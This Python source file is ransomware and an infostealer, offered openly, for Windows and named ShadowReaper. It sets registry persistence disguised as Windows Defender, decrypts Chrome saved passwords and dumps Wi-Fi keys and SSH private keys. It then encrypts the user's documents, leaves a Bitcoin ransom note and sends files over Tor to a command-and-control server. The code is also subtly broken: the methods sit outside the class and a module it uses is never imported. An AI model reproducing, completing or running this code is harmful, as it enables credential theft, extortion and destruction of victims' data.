
import os
import sys
import ssl
import json
import uuid
import shutil
import hashlib
import win32crypt
import sqlite3
import requests
import threading
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import winreg as reg
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class ShadowReaper:  
    def __init__(self):  
        self.C2 = "https://darkmesh[.]xyz/c2/api/v2"  
        self.PGP_KEY = b'-----BEGIN PGP PUBLIC KEY BLOCK-----\n...REDACTED...'  
        self.BOT_ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, os.environ.get('COMPUTERNAME', 'UNKNOWN')))  
        self.EXFIL_TYPES = ['.doc', '.pdf', '.xls', '.key', '.ovpn', '.ppk', '.kdbx']  
        self.STAGING_DIR = os.path.join(os.environ['APPDATA'], 'WindowsDefenderCache')


def _ghost_install(self):  
    # Registry persistence + shadow copy  
    try:  
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"  
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)  
        reg.SetValueEx(reg_key, "WindowsDefender", 0, reg.REG_SZ, sys.executable)  
        reg.CloseKey(reg_key)  
    except Exception:  
        pass  

    if not os.path.exists(self.STAGING_DIR):  
        os.makedirs(self.STAGING_DIR)  
        os.system(f'attrib +h +s "{self.STAGING_DIR}"')  

def _bloodhound(self, path):  
    # Advanced credential harvester  
    master_key = self._get_master_key()  
    chrome_data = self._chrome_harvest(master_key)  
    wifi_creds = self._harvest_wifi()  
    ssh_keys = self._find_ssh_keys()  
    return {  
        'system': self._system_fingerprint(),  
        'chrome': chrome_data,  
        'wifi': wifi_creds,  
        'ssh': ssh_keys  
    }  

def _chrome_harvest(self, master_key):  
    # Decrypt Chrome/Edge credentials  
    login_db = os.path.join(os.environ['LOCALAPPDATA'],  
                        'Google\\Chrome\\User Data\\default\\Login Data')  
    decrypted = []  
    try:  
        shutil.copy2(login_db, self.STAGING_DIR)  
        conn = sqlite3.connect(os.path.join(self.STAGING_DIR, 'Login Data'))  
        cursor = conn.cursor()  
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')  
        for row in cursor.fetchall():  
            encrypted_password = row[2]  
            iv = encrypted_password[3:15]  
            payload = encrypted_password[15:]  
            cipher = AES.new(master_key, AES.MODE_GCM, iv)  
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()  
            decrypted.append({  
                'url': row[0],  
                'user': row[1],  
                'pass': decrypted_pass  
            })  
        cursor.close()  
        conn.close()  
    except Exception as e:  
        pass  
    return decrypted  

def _get_master_key(self):
    import base64
    from Crypto.Cipher import AES
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def _encrypt_file(self, file_path, aes_key):
    from Crypto.Random import get_random_bytes
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = get_random_bytes(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    encrypted_data, tag = cipher.encrypt_and_digest(data)

    with open(file_path, 'wb') as f:
        f.write(iv + encrypted_data + tag)

def _harvest_wifi(self):
    wifi_list = []
    try:
        profiles = os.popen("netsh wlan show profiles").read()
        profiles = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]
        for profile in profiles:
            result = os.popen(f'netsh wlan show profile name="{profile}" key=clear').read()
            password_line = [line for line in result.splitlines() if "Key Content" in line]
            password = password_line[0].split(":")[1].strip() if password_line else ""
            wifi_list.append({"ssid": profile, "password": password})
    except:
        pass
    return wifi_list

def _find_ssh_keys(self):
    ssh_dir = os.path.expanduser("~/.ssh")
    keys = []
    if os.path.exists(ssh_dir):
        for file in os.listdir(ssh_dir):
            if file.endswith(".pem") or file.endswith(".ppk") or file.startswith("id_"):
                with open(os.path.join(ssh_dir, file), 'r') as f:
                    keys.append(f.read())
    return keys

def _system_fingerprint(self):
    return {
        "hostname": os.environ.get("COMPUTERNAME", ""),
        "username": os.getlogin(),
        "os": sys.platform,
        "uuid": self.BOT_ID
    }

def _c2_heartbeat(self):
    while True:
        try:
            data = {
                "id": self.BOT_ID,
                "status": "alive",
                "timestamp": datetime.utcnow().isoformat()
            }
            requests.post(f"{self.C2}/heartbeat", json=data, timeout=10)
        except:
            pass
        time.sleep(300)  # كل 5 دقائق

 
def _ransom_locker(self):  
    # Hybrid RSA+AES-256 cryptolocker  
    sys_info = self._bloodhound('')  
    victim_id = hashlib.sha256(json.dumps(sys_info).encode()).hexdigest()  
    aes_key = os.urandom(32)  
    encrypted_key = self._pgp_encrypt(aes_key)  
    
    for root, _, files in os.walk(os.path.expanduser('~')):  
        for file in files:  
            if os.path.splitext(file)[1].lower() in self.EXFIL_TYPES:  
                try:  
                    self._encrypt_file(os.path.join(root, file), aes_key)  
                    self._exfil_data(os.path.join(root, file))  
                except:  
                    continue  
    
    ransom_note = f"""  
    === YOUR DIGITAL LIFE IS ENCRYPTED ===  
    Victim ID: {victim_id}  
    Payment: 2 BTC to bc1q...xv7g  
    Send ENCRYPTED_KEY.bin to darkwebxch@protonmail.com  
    """  
    with open(os.path.expanduser('~/README_CRYPT.txt'), 'w') as f:  
        f.write(ransom_note)  
    with open(os.path.join(self.STAGING_DIR, 'ENCRYPTED_KEY.bin'), 'wb') as f:  
        f.write(encrypted_key)  

def _pgp_encrypt(self, data):  
    # PGP encryption using pre-loaded public key  
    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(self.PGP_KEY))  
    return cipher_rsa.encrypt(data)  

def _exfil_data(self, file_path):  
    # Tor-based exfiltration  
    session = requests.session()  
    session.proxies = {'http': 'socks5h://localhost:9050',  
                     'https': 'socks5h://localhost:9050'}  
    with open(file_path, 'rb') as f:  
        files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}  
        session.post(f"{self.C2}/exfil", files=files, timeout=30)  

def run(self):  
    self._ghost_install()  
    threading.Thread(target=self._ransom_locker).start()  
    self._c2_heartbeat()  


if __name__ == '__main__':  
    if sys.platform.startswith('win'):  
        if len(sys.argv) > 1 and sys.argv[1] == '--daemon':  
            ShadowReaper().run()  
        else:  
            os.startfile(sys.executable, f'"{sys.argv[0]}" --daemon')  